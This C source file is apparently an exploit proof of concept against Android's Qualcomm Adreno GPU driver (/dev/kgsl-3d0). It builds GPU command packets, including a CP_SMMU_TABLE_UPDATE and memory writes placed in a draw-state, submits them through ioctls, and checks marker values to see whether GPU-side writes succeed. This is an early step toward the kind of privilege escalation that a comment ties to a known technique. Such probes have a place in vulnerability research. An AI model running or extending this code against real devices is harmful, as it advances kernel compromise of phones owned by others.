#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

#define KGSL_IOC_TYPE 0x09
struct kgsl_map_user_mem { int fd; unsigned long gpuaddr; size_t len; size_t offset;
    unsigned long hostptr; unsigned int memtype; unsigned int flags; };
struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize; unsigned int numcmds;
    uint64_t objlist; unsigned int objsize; unsigned int numobjs;
    uint64_t synclist; unsigned int syncsize; unsigned int numsyncs;
    unsigned int context_id; unsigned int timestamp;
};
struct kgsl_command_object {
    uint64_t offset; uint64_t gpuaddr; uint64_t size;
    unsigned int flags; unsigned int id;
};
#define KGSL_USER_MEM_TYPE_ADDR 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_COMMAND_SYNC 0x1
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

#define CP_TYPE7_PKT(op, cnt) ((7<<28)|((op)<<16)|((cnt)&0x3FFF))
#define CP_NOP 0x10
#define CP_WAIT_FOR_IDLE 0x26
#define CP_WAIT_FOR_ME 0x13
#define CP_WAIT_MEM_WRITES 0x12
#define CP_MEM_WRITE 0x3d
#define CP_SET_DRAW_STATE 0x43
#define CP_SET_MODE 0x63
#define CP_SMMU_TABLE_UPDATE 0x53
#define DRAW_STATE_MODE_BINNING 0x1
#define DRAW_STATE_MODE_GMEM 0x2
#define DRAW_STATE_MODE_BYPASS 0x4

#define lo32(x) ((uint32_t)((x)&0xFFFFFFFF))
#define hi32(x) ((uint32_t)(((x)>>16)>>16))

int main() {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("[-] open\n"); return 1; }
    printf("[+] fd=%d\n", fd);

    struct kgsl_drawctxt_create ctx = { .flags = 0x00001812 };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx)) { printf("[-] ctx\n"); close(fd); return 1; }
    printf("[+] ctx id=%u\n", ctx.drawctxt_id);

    /* Buffer: draw_state at 0x000, payload at 0x400, result at 0x1000 */
    uint32_t *buf = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) { printf("[-] mmap\n"); goto end; }
    memset(buf, 0x55, 0x2000);

    uint64_t base_ga = 0;
    {	struct kgsl_map_user_mem m = { .len = 0x2000, .hostptr = (unsigned long)buf,
        	.memtype = KGSL_USER_MEM_TYPE_ADDR };
    	if (ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m)) { printf("[-] map\n"); goto end; }
    	base_ga = m.gpuaddr; }
    printf("[+] cpu=%p gpu=0x%lx\n", buf, (unsigned long)base_ga);

    uint64_t ds_ga = base_ga + 0x000;
    uint64_t pl_ga = base_ga + 0x400;
    uint64_t rs_ga = base_ga + 0x1000;

    /* === DRAW STATE at 0x000 === (exactly as cheese) */
    uint32_t *ds = buf;
    uint32_t *ds_start = ds;
    
    /* CP_SMMU_TABLE_UPDATE with addr=0 (might mean "reload default") */
    *ds++ = CP_TYPE7_PKT(CP_SMMU_TABLE_UPDATE, 4);
    *ds++ = 0;   /* addr_lo = 0 */
    *ds++ = 0;   /* addr_hi = 0 */
    *ds++ = 0;   /* flags = 0 */
    *ds++ = 0;   /* flags = 0 */
    
    /* WAIT_FOR_ME + WAIT_FOR_IDLE */
    *ds++ = CP_TYPE7_PKT(CP_WAIT_FOR_ME, 0);
    *ds++ = CP_TYPE7_PKT(CP_WAIT_FOR_IDLE, 0);
    
    /* MEM_WRITE: write 0xDEADBEEF to result */
    *ds++ = CP_TYPE7_PKT(CP_MEM_WRITE, 3);
    *ds++ = lo32(rs_ga);
    *ds++ = hi32(rs_ga);
    *ds++ = 0xDEADBEEF;
    
    /* MEM_WRITE completion marker */
    *ds++ = CP_TYPE7_PKT(CP_MEM_WRITE, 3);
    *ds++ = lo32(rs_ga + 4);
    *ds++ = hi32(rs_ga + 4);
    *ds++ = 0xCAFEBABE;
    
    *ds++ = CP_TYPE7_PKT(CP_WAIT_MEM_WRITES, 0);
    *ds++ = CP_TYPE7_PKT(CP_NOP, 0);
    int ds_dwords = ds - ds_start;
    printf("[+] drawstate: %d dw\n", ds_dwords);

    /* === PAYLOAD at 0x400 === */
    uint32_t *pp = buf + 0x400/4;
    uint32_t *pl_start = pp;
    
    *pp++ = CP_TYPE7_PKT(CP_SET_MODE, 1);
    *pp++ = 1; /* ALWAYS */
    
    *pp++ = CP_TYPE7_PKT(CP_SET_DRAW_STATE, 3);
    *pp++ = ds_dwords | ((DRAW_STATE_MODE_BINNING|DRAW_STATE_MODE_GMEM|DRAW_STATE_MODE_BYPASS) << 20);
    *pp++ = lo32(ds_ga);
    *pp++ = hi32(ds_ga);
    
    *pp++ = CP_TYPE7_PKT(CP_NOP, 0);
    int pl_bytes = ((char*)pp - (char*)pl_start);
    printf("[+] payload: %d bytes\n", pl_bytes);

    __builtin___clear_cache((char*)buf, (char*)buf + 0x2000);

    /* Submit as IB */
    buf[0x1000/4] = 0xAAAAAAAA;
    buf[0x1004/4] = 0xAAAAAAAA;
    
    struct kgsl_command_object obj = { .gpuaddr = pl_ga, .size = pl_bytes,
        .flags = KGSL_CMDLIST_IB };
    struct kgsl_gpu_command req = { .flags = KGSL_COMMAND_SYNC,
        .cmdlist = (uint64_t)(unsigned long)&obj, .cmdsize = sizeof(obj), .numcmds = 1,
        .context_id = ctx.drawctxt_id, .timestamp = 1 };
    printf("[*] submitting...\n");
    int r = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);
    printf("submit: %s ts=%u\n", r ? strerror(errno) : "OK", req.timestamp);

    /* Read result (cache may be stale but let's try) */
    printf("  rs[0]=0x%08x rs[1]=0x%08x\n", buf[0x1000/4], buf[0x1004/4]);
    if (buf[0x1000/4] == 0xDEADBEEF || buf[0x1004/4] == 0xCAFEBABE)
        printf("✅✅✅ GPU MEM_WRITE WORKS through drawstate!\n");
    else if (buf[0x1000/4] != 0xAAAAAAAA)
        printf("⚠️  Unexpected: %08x\n", buf[0x1000/4]);
    else
        printf("❌ No write (cache?)\n");

    /* Retry with mprotect cache sync */
    mprotect(buf + 0x1000/4, 0x1000, PROT_NONE);
    mprotect(buf + 0x1000/4, 0x1000, PROT_READ|PROT_WRITE);
    printf("  after cache sync: rs[0]=0x%08x\n", buf[0x1000/4]);

end:
    { struct kgsl_drawctxt_destroy d = { .drawctxt_id = ctx.drawctxt_id };
      ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &d); }
    close(fd);
    return 0;
}